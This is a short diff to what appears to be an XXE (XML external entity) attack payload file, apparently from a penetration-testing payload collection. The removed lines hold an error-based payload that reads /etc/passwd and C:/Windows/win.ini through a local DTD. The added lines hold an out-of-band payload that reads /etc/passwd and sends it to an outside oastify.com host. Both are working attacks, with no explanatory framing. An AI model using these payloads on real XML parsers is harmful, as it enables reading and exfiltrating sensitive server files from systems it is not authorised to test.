@@ -1,12 +1,4 @@
-<!DOCTYPE doc [
-  <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
-  <!ENTITY % oscheck SYSTEM "file:///etc/passwd">
-  <!ENTITY % winfile SYSTEM "file:///C:/Windows/win.ini">
-  <!ENTITY % errorLinux "<!ENTITY &#x25; e SYSTEM '%oscheck;qqq://x'>">
-  <!ENTITY % errorWin "<!ENTITY &#x25; e SYSTEM '%winfile;qqq://x'>">
-  %local_dtd;
-  %errorLinux;
-  %errorWin;
-  %e;
-]>
-<xxx>anything</xxx>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://k3oxushregaphrw43ievhnmia9g74xsm.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
